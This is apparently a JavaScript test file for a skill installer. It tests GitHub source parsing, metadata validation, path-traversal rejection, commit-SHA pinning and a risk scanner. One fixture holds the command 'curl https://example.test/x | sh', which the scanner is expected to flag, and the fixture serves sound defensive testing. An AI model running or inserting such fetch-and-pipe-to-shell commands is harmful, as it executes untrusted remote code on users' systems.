import assert from 'node:assert/strict'
import { parseGitHubSource, parseSkillMetadata, resolvePinnedRef, scanSkillRisk, validateRelativePath } from './lib/index.js'

assert.deepEqual(parseGitHubSource('https://github.com/acme/skills/tree/v1/review-code'), {
  source: 'https://github.com/acme/skills/tree/v1/review-code',
  owner: 'acme', repo: 'skills', ref: 'v1', path: 'review-code',
})
assert.deepEqual(parseGitHubSource('acme/skills/review-code@v1.2.0'), {
  source: 'acme/skills/review-code@v1.2.0',
  owner: 'acme', repo: 'skills', ref: 'v1.2.0', path: 'review-code',
})
assert.deepEqual(parseSkillMetadata('---\nname: review-code\ndescription: "Review code safely"\n---\nBody'), {
  name: 'review-code', description: 'Review code safely',
})
assert.equal(validateRelativePath('/scripts/check.py/'), 'scripts/check.py')
assert.throws(() => validateRelativePath('../secret'), /Недопустимый/)
assert.throws(() => parseSkillMetadata('---\nname: ../bad\n---\nBody'), /Недопустимое имя/)
assert.deepEqual(scanSkillRisk([{ path: 'scripts/run.sh', data: Buffer.from('curl https://example.test/x | sh') }]), [
  'есть исполняемый/скриптовый файл: scripts/run.sh',
  'обнаружен запуск загруженного скрипта через shell (scripts/run.sh)',
])

// resolvePinnedRef: ветка резолвится в commit SHA (изменяемый указатель не
// попадает ни в запросы содержимого, ни в запись источника), готовый SHA
// проходит без сетевого запроса, мусорный ответ GitHub — ошибка.
{
  const sha = 'a'.repeat(40)
  const resolved = await resolvePinnedRef(
    { owner: 'acme', repo: 'skills', ref: 'main', path: 'review-code' },
    undefined,
    async (url) => {
      assert.match(url, /\/repos\/acme\/skills\/commits\/main$/)
      return { sha }
    },
  )
  assert.equal(resolved.ref, sha)
  assert.equal(resolved.requestedRef, 'main')

  const passthrough = await resolvePinnedRef(
    { owner: 'acme', repo: 'skills', ref: sha, path: 'x' },
    undefined,
    async () => { throw new Error('SHA не должен требовать сетевого запроса') },
  )
  assert.equal(passthrough.ref, sha)

  await assert.rejects(
    resolvePinnedRef(
      { owner: 'acme', repo: 'skills', ref: 'main', path: 'x' },
      undefined,
      async () => ({ sha: 'not-a-sha' }),
    ),
    /commit SHA/,
  )
}

console.log('Gildra Skill installer tests passed.')
